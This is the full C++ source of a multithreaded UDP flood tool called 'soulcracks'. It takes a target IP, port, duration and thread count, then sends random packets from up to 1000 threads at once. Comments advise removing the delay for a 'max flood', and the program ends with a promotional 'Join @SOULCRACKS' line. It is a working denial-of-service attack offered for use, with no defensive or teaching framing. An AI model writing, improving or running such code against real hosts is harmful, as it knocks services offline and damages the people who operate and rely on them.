#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>

#ifdef _WIN32
    #include <windows.h>
    void usleep(__int64 duration) { Sleep(static_cast<DWORD>(duration / 1000)); }
#else
    #include <unistd.h>
#endif

#define PAYLOAD_SIZE 20

class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {
        srand(static_cast<unsigned int>(time(nullptr) ^ (pthread_self() ^ reinterpret_cast<pthread_t>(this))));
    }

    // Fast, efficient random payload
    void generate_payload(char* buffer, size_t size) {
        static const char charset[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        for (size_t i = 0; i < size; ++i) {
            buffer[i] = charset[rand() % (sizeof(charset) - 1)];
        }
        buffer[size] = '\0'; // Null-terminate if used as string
    }

    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime = time(nullptr) + duration;
        char payload[PAYLOAD_SIZE + 1];

        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            pthread_exit(nullptr);
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(static_cast<uint16_t>(port));
        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

        if (server_addr.sin_addr.s_addr == INADDR_NONE) {
            std::cerr << "Invalid IP address: " << ip << "\n";
            close(sock);
            pthread_exit(nullptr);
        }

        while (time(nullptr) <= endtime) {
            generate_payload(payload, PAYLOAD_SIZE);
            if (sendto(sock, payload, PAYLOAD_SIZE, 0,
                       reinterpret_cast<const struct sockaddr*>(&server_addr),
                       sizeof(server_addr)) < 0) {
                // Just continue on failure (e.g. network issues)
                // perror("Send failed"); // Uncomment for debug
            }
            // Optional: slight delay per packet (remove for max flood)
            // usleep(1000); // 1ms delay → ~1000 pps per thread
        }

        close(sock);
    }

private:
    std::string ip;
    int port;
    int duration;
};

void handle_sigint(int sig) {
    std::cout << "\nStopping attack...\n";
    exit(0);
}

void usage() {
    std::cout << "Usage: ./soulcracks ip port duration threads\n"
              << "Example: ./soulcracks 192.168.1.100 80 60 10\n";
    exit(1);
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        usage();
    }

    std::string ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int threads = std::atoi(argv[4]);

    // Input validation
    if (port <= 0 || port > 65535) {
        std::cerr << "Error: Port must be between 1 and 65535.\n";
        return 1;
    }
    if (duration <= 0) {
        std::cerr << "Error: Duration must be greater than 0.\n";
        return 1;
    }
    if (threads <= 0 || threads > 1000) {
        std::cerr << "Error: Threads must be between 1 and 1000.\n";
        return 1;
    }

    std::signal(SIGINT, handle_sigint);

    std::vector<pthread_t> thread_ids(threads);
    std::vector<std::unique_ptr<Attack>> attacks;
    attacks.reserve(threads);

    std::cout << "Attack started on " << ip << ":" << port
              << " for " << duration << " seconds with " << threads << " threads\n";

    for (int i = 0; i < threads; ++i) {
        attacks.push_back(std::make_unique<Attack>(ip, port, duration));

        if (pthread_create(&thread_ids[i], nullptr,
                           [](void* arg) -> void* {
                               Attack* attack = static_cast<Attack*>(arg);
                               attack->attack_thread();
                               return nullptr;
                           }, attacks[i].get()) != 0) {
            perror("Failed to create thread");
            exit(1);
        }

        std::cout << "Launched thread with ID: " << thread_ids[i] << "\n";
    }

    // Wait for all threads to finish
    for (int i = 0; i < threads; ++i) {
        pthread_join(thread_ids[i], nullptr);
    }

    std::cout << "Attack finished. Join @SOULCRACKS\n";
    return 0;
}